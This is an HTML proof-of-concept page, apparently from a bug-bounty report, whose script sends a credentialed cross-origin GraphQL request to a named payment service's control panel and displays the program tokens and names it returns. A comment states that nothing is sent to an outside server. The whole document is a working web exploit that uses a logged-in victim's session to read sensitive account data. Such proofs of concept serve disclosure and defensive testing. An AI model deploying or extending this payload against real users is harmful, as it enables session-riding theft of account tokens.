 <!DOCTYPE html>
  <html>                                                                                                                                                             
  <body>                                                                                                                                                           
  <script>
  fetch('https://controlpanel.hyperwallet.com/graphql', {
    method: 'POST',                                                                                                                                                  
    credentials: 'include',
    headers: {                                                                                                                                                       
      'Content-Type': 'application/graphql',                                                                                                                       
      'Accept': 'application/json'                                                                                                                                   
    },
    body: '{ programs { nodes { token name } } }'                                                                                                                    
  })                                                                                                                                                                 
  .then(r => r.json())
  .then(data => {                                                                                                                                                    
    document.body.innerText = JSON.stringify(data);                                                                                                                
    // Shows data in page — no exfiltration to external server                                                                                                       
  });                                                                                                                                                                
  </script>                                                                                                                                                          
  </body>                                                                                                                                                            
  </html>
